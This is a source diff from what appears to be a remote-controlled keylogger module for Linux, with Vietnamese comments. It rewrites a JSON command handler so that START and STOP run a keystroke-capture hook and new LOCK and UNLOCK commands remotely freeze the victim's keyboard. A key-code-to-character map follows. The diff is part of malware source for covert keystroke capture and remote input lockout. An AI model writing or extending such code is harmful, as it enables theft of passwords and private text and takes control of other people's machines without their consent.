@@ -1,29 +1,5 @@
 #include "KeyManager.hpp"
 
-json KeyManager::handle_command(const json& request) {
-    std::string command = request.value("command", "");
-    
-    if (command == "START") {
-        start_hook();
-        return {
-            {"status", "success"}, 
-            {"module", get_module_name()},
-            {"data", "Keylogger started"}};
-    }
-    if (command == "STOP") {
-        stop_hook();
-        return {
-            {"status", "success"}, 
-            {"module", get_module_name()},
-            {"error", "Keylogger stopped"}};
-    }
-
-    return {
-        {"status", "error"}, 
-        {"module", get_module_name()},
-        {"error", "Unknown command"}};
-}
-
 // --- BIẾN TOÀN CỤC ---
 static KeyCallback g_callback = nullptr;
 static std::atomic<bool> g_running{false};
@@ -35,6 +11,38 @@ static bool g_isCtrl = false;
 static bool g_isAlt = false;
 static bool g_isShift = false;
 
+json KeyManager::handle_command(const json& request) {
+    std::string command = request.value("command", "");
+    
+    if (command == "START") {
+        start_hook();
+        return {
+            {"status", "success"}, 
+            {"module", get_module_name()},
+            {"data", "Keylogger started"}};
+    }
+    else if (command == "STOP") {
+        stop_hook();
+        return {
+            {"status", "success"}, 
+            {"module", get_module_name()},
+            {"error", "Keylogger stopped"}};
+    }
+    else if (command == "LOCK") {
+        if (g_fd == -1) start_hook();
+        set_locked(true);
+        return {{"status", "success"}, {"message", "Keyboard LOCKED. Press Ctrl+Alt+U to unlock locally."}};
+    }
+    else if (command == "UNLOCK") {
+        set_locked(false);
+        return {{"status", "success"}, {"message", "Keyboard UNLOCKED"}};
+    }
+
+    return {
+        {"status", "error"}, 
+        {"module", get_module_name()},
+        {"error", "Unknown command"}};
+}
 static std::map<int, std::string> g_keyMap = {
     {KEY_A, "a"}, {KEY_B, "b"}, {KEY_C, "c"}, {KEY_D, "d"}, {KEY_E, "e"},
     {KEY_F, "f"}, {KEY_G, "g"}, {KEY_H, "h"}, {KEY_I, "i"}, {KEY_J, "j"},
